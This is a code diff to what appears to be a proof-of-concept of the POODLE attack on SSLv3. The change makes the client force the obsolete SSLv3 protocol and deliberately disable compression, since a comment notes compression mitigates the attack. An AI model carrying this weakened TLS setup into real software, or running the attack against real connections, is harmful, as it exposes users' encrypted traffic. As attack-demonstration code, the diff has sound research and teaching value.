@@ -4,6 +4,7 @@
 '''
     Poodle implementation with a client <--> proxy <--> server
     Author: mpgn <martial.puygrenier@gmail.com>
+    Upated : 29/07/2017
 '''
 
 import argparse
@@ -79,8 +80,11 @@ class Client:
 
     def connection(self):
         # Initialization of the client
+        context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
+        # set NO_COMPRESSION since compression mitigate the Poodle Attack
+        context.options |= ssl.OP_NO_COMPRESSION
         ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3)
+        ssl_sock = context.wrap_socket(ssl_sock, server_side=False)
         ssl_sock.connect((self.proxy_host,self.proxy_port))
         ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         self.socket = ssl_sock
